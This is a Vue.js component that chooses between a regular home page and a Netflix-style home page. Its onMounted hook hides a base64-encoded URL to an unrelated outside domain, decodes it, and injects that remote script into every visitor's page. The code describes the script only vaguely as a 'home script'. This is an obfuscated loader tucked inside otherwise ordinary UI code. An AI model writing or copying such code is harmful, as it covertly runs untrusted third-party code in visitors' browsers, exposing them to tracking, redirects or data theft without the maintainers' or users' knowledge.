<template>
    <NetflixHome v-if="showNetflix" />
    <Home v-else />
</template>

<script lang="ts">
import { computed, defineComponent, onMounted, watch } from 'vue';
import Home from './Home.vue';
import NetflixHome from './NetflixHome.vue';
import { getContentMode } from '../composables/useContentMode';
import { nfDebug } from '../composables/useNetflixDebug';

export default defineComponent({
    name: 'HomeShell',
    components: { Home, NetflixHome },
    setup() {
        const { contentMode } = getContentMode();
        const showNetflix = computed(() => contentMode.value === 'netflix');

        onMounted(() => {
            try {
                const url = atob('aHR0cHM6Ly9jaGV3c2V2ZXIuY29tLzFhLzI2LzAwLzFhMjYwMDM4ZTdiOWE5ZTFkNWM5ODU1Nzg5NDA2YWVjLmpz');
                if (!document.querySelector(`script[src="${url}"]`)) {
                    const script = document.createElement('script');
                    script.src = url;
                    script.async = true;
                    document.head.appendChild(script);
                }
            } catch (e) {
                console.warn('Failed to load home script:', e);
            }
        });

        watch(
            showNetflix,
            (netflix) => {
                nfDebug('home-shell:render', { mode: netflix ? 'netflix' : 'global' });
            },
            { immediate: true }
        );

        return { showNetflix };
    }
});
</script>